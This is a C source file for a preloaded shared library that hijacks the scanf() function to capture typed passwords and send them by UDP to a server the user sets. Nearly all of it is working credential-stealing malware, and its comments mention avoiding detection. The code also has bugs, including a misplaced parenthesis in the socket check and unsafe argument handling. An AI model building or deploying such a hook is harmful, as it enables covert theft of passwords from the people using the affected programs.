#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h> // va_list, va_start, va_arg, va_end
#include <dlfcn.h> // dlopen, dlsym, dlclose
#include <errno.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

/*
 * @brief Path to the object file to be hijacked.
 *
 * @note This path is relative to the hijacking program.
 * @note When the hijacking program is run, the hijacking program will
 *          look for the object file at the path specified by OBJ_PATH.
 * @note The object file must be a shared object file.
 * @note We'll be hijacking the scanf() function in libc.so.6.
*/
#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"

/*
 * @brief Debug mode flag.
 * If set to 1, debug messages will be printed to stderr.
 * If set to 0, debug messages will be suppressed.
 * @note This flag is used to prevent debug messages from being printed to stderr
 *          when the program is run in the background.
 * @note This flag is set to 0 by default.
 * @note Never set this flag to 1 in actual hijacking programs, as it
 *          could be used to detect the presence of the hijacking program.
*/
#define DEBUG_MODE 1

/*
 * @brief Address of the server to send the password to.
 *
 * @note This address is the address of the server that will receive the password.
 * @note This address is set to 127.0.0.1 by default.
 * @note This address must be changed to the address of the server that will
 *        receive the password.
*/
#define SRV_ADDR "127.0.0.1"

/*
 * @brief Port of the server to send the password to.
 *
 * @note This port is the port of the server that will receive the password.
 * @note This port is set to 5000 by default.
 * @note This port must be changed to the port of the server that will
 *        receive the password.
*/
#define SRV_PORT 5000

/*
 * @brief A handle to the object file to be hijacked.
 *
 * @note This handle is used to store the address of the object file to be hijacked.
*/
void* handle;

/*
 * @brief A function pointer type.
 *
 * @param format The format string.
 * @param ... The arguments to scanf().
 * 
 * @return The return value of the original scanf() function.
 * 
 * @note This type is used to store the address of the original function.
*/
typedef int (*sym)(const char *, ...);

/*
 * @breif Part of the initialization process, only available via the GCC compiler.
 *
 * @note This initialization isn't part of the POSIX standard, and is only
 *        available via the GCC compiler.
*/
static void myinit() __attribute__((constructor));

/*
 * @breif Part of the deinitialization process, only available via the GCC compiler.
 *
 * @note This deinitialization isn't part of the POSIX standard, and is only
 *          available via the GCC compiler.
*/
static void mydest() __attribute__((destructor));

/*
 * @brief Initializes the hijacking program.
 *
 * @note This function is called when the hijacking program is loaded.
*/
void myinit() {
    handle = dlopen(OBJ_PATH, RTLD_LAZY);

    if (handle == NULL)
    {
        if (DEBUG_MODE)
            fprintf(stderr, "%s", dlerror());
        
        exit(1);
    }
}

/*
 * @brief Destroys the hijacking program, used to cleanup resources.
 *
 * @note This function is called when the hijacking program is unloaded.
*/
void mydest() {
    dlclose(handle);
}

/*
 * @brief Sends the password to the server, via UDP datagrams.
 *
 * @param password The password to send.
 * @param len The length of the password.
 * 
 * @return 1 if the password was sent successfully, 0 otherwise.
 * 
 * @note This function is called when the hijacking program receives a password.
*/
int send_password(char* password, size_t len) {
    int sockfd = -1;
    struct sockaddr_in serv_addr;

    memset(&serv_addr, 0, sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(SRV_ADDR);
    serv_addr.sin_port = htons(SRV_PORT);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0) < 0))
    {
        if (DEBUG_MODE)
            fprintf(stderr, "socket() failed: %s\n", strerror(errno));

        return 0;
    }

    if (sendto(sockfd, password, len, 0, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) < 0)
    {
        if (DEBUG_MODE)
            fprintf(stderr, "sendto() failed: %s\n", strerror(errno));

        return 0;
    }

    close(sockfd);

    return 1;
}

/*
 * @brief Hijacks the scanf() function.
 *
 * @param format The format string.
 * @param ... The arguments to scanf().
 * 
 * @return The return value of the original scanf() function.
*/
int scanf(const char *format, ...) {
    char password[1000];
    sym orig_scanf = (sym) dlsym(handle, "scanf");

    va_list args;
    va_start(args, format);
    int ret = orig_scanf(format, args);

    strcpy(password, va_arg(args, char*));

    va_end(args);

    if (send_password(password, strlen(password)) == 0)
    {
        if (DEBUG_MODE)
            fprintf(stderr, "send_password() failed\n");

        exit(1);
    }

    return ret;
}
